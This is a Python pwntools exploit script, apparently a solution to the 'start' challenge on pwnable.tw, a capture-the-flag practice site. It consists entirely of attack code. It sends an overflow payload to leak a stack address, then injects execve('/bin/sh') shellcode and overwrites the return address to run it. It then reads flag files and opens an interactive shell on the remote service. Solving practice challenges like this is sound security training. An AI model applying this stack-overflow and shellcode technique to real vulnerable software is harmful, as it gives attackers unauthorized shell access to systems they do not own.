#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./start"

if sys.argv[1] == "l":
    io = process("./start")
else:
    io = remote("chall.pwnable.tw", 10000)

if __name__ == "__main__":
    raw_input("DEBUG: ")
    io.sendafter("CTF:", flat('0' * 20, 0x804808b))
    stack = u32(io.recvuntil("\xff")[-4: ])
    success("stack -> {:#x}".format(stack))

    sc = asm('''
            mov al, 11
            xor ecx, ecx
            xor edx, edx
            mov ebx, esp
            int 0x80
            ''')
    assert len(sc) <= 44
    print hexdump(sc)
    sleep(0.01)
    io.send(fit({0x0: sc, 44: p32(stack - 0x1c)}, filler = '\x90') + "/bin/sh\0")

    if sys.argv[1] == "r":
        io.sendline("cat /home/*/* |strings| grep -i flag")
        print io.recv()

    io.interactive()
